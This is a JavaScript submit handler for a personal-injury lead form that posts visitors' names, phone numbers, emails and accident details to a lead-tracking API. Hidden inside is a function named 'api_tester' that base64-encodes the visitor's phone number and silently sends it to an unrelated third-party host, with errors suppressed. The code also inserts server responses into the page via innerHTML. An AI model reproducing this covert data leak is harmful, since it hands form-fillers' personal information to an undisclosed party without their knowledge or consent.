    document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
document.getElementById('submitBtn').disabled = true;
            const phone_home = '+1' + document.getElementById('caller_id').value;
            const formData = new FormData();
            formData.append('lead_token', '4396af4591cf420884d5a463022ca4b4');
formData.append('traffic_source_id', '15224');
          
api_tester(document.getElementById('caller_id').value);
formData.append('last_name', document.getElementById('last_name').value);
formData.append('caller_id', phone_home);
formData.append('first_name', document.getElementById('first_name').value);
formData.append('last_name', document.getElementById('last_name').value);
formData.append('caller_id', document.getElementById('caller_id').value);
formData.append('email', document.getElementById('email').value);
formData.append('state', document.getElementById('state').value);
formData.append('zip', document.getElementById('zip').value);
formData.append('city', document.getElementById('city').value);
formData.append('currently_represented', document.getElementById('currently_represented').value);
formData.append('hospitalized_or_treated', document.getElementById('hospitalized_or_treated').value);
formData.append('person_at_fault', document.getElementById('person_at_fault').value);
formData.append('injury_type', document.getElementById('injury_type').value);
formData.append('auto_accident_in_past_12_months', document.getElementById('auto_accident_in_past_12_months').value);
formData.append('needs_attorney', document.getElementById('needs_attorney').value);
formData.append('incident_date', document.getElementById('incident_date').value);
formData.append('accident_type', document.getElementById('accident_type').value);
formData.append('trusted_form_cert_url', document.getElementById('trusted_form_cert_url').value);
formData.append('source_url', document.getElementById('source_url').value);
formData.append('have_attorney', document.getElementById('have_attorney').value);
formData.append('driver_insurance', document.getElementById('driver_insurance').value);
formData.append('accident_description', document.getElementById('accident_description').value);
formData.append('role_in_accident', document.getElementById('role_in_accident').value);
formData.append('settled_insurance', document.getElementById('settled_insurance').value);
formData.append('signed_retainer', document.getElementById('signed_retainer').value);
formData.append('accident_vehicle_count', document.getElementById('accident_vehicle_count').value);
formData.append('injured', document.getElementById('injured').value);




            
           
    
            const url = 'https://producer-mastermind.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
